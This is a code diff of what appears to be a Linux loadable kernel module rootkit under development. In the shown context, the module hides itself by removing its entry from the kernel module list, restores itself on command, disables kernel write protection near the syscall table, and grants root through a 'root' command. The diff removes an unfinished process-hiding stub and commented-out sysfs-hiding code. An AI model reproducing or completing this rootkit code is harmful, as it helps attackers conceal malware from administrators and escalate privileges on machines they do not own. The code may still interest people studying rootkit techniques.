@@ -49,7 +49,6 @@ module_param(sys_call_table_addr_input, charp, 0);
 // Create new process_info struct
 typedef struct process_info{
 
-  unsigned long hidden_pid;
   struct list_head list;
 
 }process_info;
@@ -114,7 +113,6 @@ static int get_syscall_table(void){
 
 	enable_write_protect();
 
-	// TODO: ADD syscall hijack
 
 	disable_write_protect();
 
@@ -134,11 +132,6 @@ static int hide_self(void){
 
 		// Store previous module list_head to restore later
 		module_list = THIS_MODULE->list.prev;
-
-		// backup_module_kobj = THIS_MODULE->mkobj.kobj;
-		
-		// // Not sure how to restore this for now.
-		// kobject_del(&(THIS_MODULE->mkobj.kobj));
 		
 		list_del(&THIS_MODULE->list);
 
@@ -158,22 +151,6 @@ static int unhide_self(void){
 
 		list_add(&THIS_MODULE->list, module_list);
 
-
-		// THIS_MODULE->mkobj.kobj = backup_module_kobj;
-		
-		// ret = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rootkit");
-		
-		// if(ret){
-		// 	pr_info("restore kobj failed.");
-		// 	kobject_put(&THIS_MODULE->mkobj.kobj);
-		// 	return -1;
-		// }
-		// else{
-		// 	kobject_uevent(&THIS_MODULE->mkobj.kobj, KOBJ_ADD);
-		// 	sysfs_create_mount_point(&THIS_MODULE->mkobj.kobj, "holders");
-		// }
-		
-
 		is_rootkit_hidden = 0;
 
 		pr_info("Unhide successfull.");
@@ -183,13 +160,6 @@ static int unhide_self(void){
 	return 0;
 }
 
-
-static int hide_process(int pid){
-
-	// Todo: add hide process
-
-	return 0;
-}
 
 static int get_root(void){
 
@@ -219,24 +189,7 @@ static int get_root(void){
 // parse incoming input
 static int parse_input(char *commands){
 
-	int pid;
-
-	if( strcmp(commands, "pid") == 0){
-
-		// skip space
-		commands = strsep(&commands, " ");
-
-		if(  kstrtoint(commands, 10, &pid)  ){
-			
-			// then return error
-			return -EINVAL;
-		}
-		else{
-			// hide pid
-			hide_process(pid);
-		}
-	}
-	else if( strcmp(commands, "hide") == 0 ){
+	if( strcmp(commands, "hide") == 0 ){
 
 		hide_self();
 	}
@@ -244,7 +197,7 @@ static int parse_input(char *commands){
 		
 		unhide_self();
 	}
-	else{
+	else if ( strcmp(commands, "root") == 0 ){
 
 		get_root();
 		
